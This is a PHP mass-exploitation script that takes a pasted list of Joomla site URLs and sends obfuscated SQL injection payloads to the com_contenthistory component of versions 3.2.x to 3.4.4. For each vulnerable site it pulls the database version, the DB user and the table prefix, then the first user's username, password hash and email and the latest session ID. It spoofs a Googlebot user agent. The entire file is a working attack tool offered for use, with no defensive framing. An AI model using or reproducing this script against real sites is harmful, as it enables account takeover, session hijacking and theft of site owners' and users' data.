<b>Joomla 3.2.x to 3.4.4 sql injection</b>
<?php
// BY Magico >> www.sec4ever.com

@set_time_limit(0);
echo'<form method="post">
<textarea name="ss" cols="50" rows="15" ></textarea><br>
<input name="g" type="submit" />
</form>';
$g = $_POST['g'];   $ss = $_POST['ss'];
//==================================================================
if(isset($g)){
$arr = explode("\r\n",$ss);
//==================================================================
        foreach($arr as $url){
        $url = @trim($url);
        
$py1="polygon%28%28/*!00000select*/*/*!00000from*/%28/*!00000select*/*/*!00000from*/%28/*!00000select*/concat_ws%280x7e3a,0x6d616769636f,version%28%29,user%28%29%29as%20mk%29%60%60%29​%60%60%29%29";

$py2="polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,0x6d616769636f,(/*!00000select*//*!00000table_name*//*!00000from*//*!00000information_schema*/.tables/*!00000where*/table_schema=database() and/*!00000table_name*/like 0x25636f6e74656e745f7479706573 limit 0,1))as mk)``)``))";
    
$site = "$url/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=75&type_id=1&list[select]=$py1";
$site2 = "$url/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=75&type_id=1&list[select]=$py2";

        $src= magico($site);
        preg_match("/select 'magico\~:(.*?)\~:(.*?)' AS/",$src,$m);
          
        //  echo"<pre>"; print_r($m);
            if(!empty($m[1])){
            echo "----------------------------------------------------------<br>";
            echo "<b>[#] $url : vuln<b><br><br>";    
            echo "[+] version : $m[1]<br>";    
            echo "[+] user db : $m[2]<br>";
            $src2= magico($site2);
            preg_match("/select 'magico\~:(.*?)_(.*?)' AS/",$src2,$m2);
            echo "[+] prefix : $m2[1]_<br>";
            $prfx = $m2[1];
            
$py3="polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,(/*!00000select*/concat_ws(0x7e3a,0x6d616769636f,username,password,email) /*!00000from*/ "."$prfx"."_users order by id ASC limit 0,1),(/*!00000select*/session_id /*!00000from*/ "."$prfx"."_session order by time DESC limit 0,1))as mk)``)``))";

$site3 = "$url/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=75&type_id=1&list[select]=$py3";
            $src3= magico($site3);
            preg_match("/select 'magico\~:(.*?)\~:(.*?)\~:(.*?)\~:(.*?)' AS/",$src3,$m3);
            echo "[+] user : $m3[1]<br>";
            echo "[+] pass : $m3[2]<br>";
            echo "[+] email : $m3[3]<br>";
            echo "[+] session_id : $m3[4]</b><br>";
                
            }else{echo "----------------------------------------------------------<br>";
            echo "[-]$url : Not Vuln <br>";
            }
    
        } //end foreach
//================================================================================​=================================================================
}// enfif
//===========================================================================
function magico($vln){

        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $vln);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
        $source = curl_exec($curl);
        return $source;
}
//===========================================================================
?>
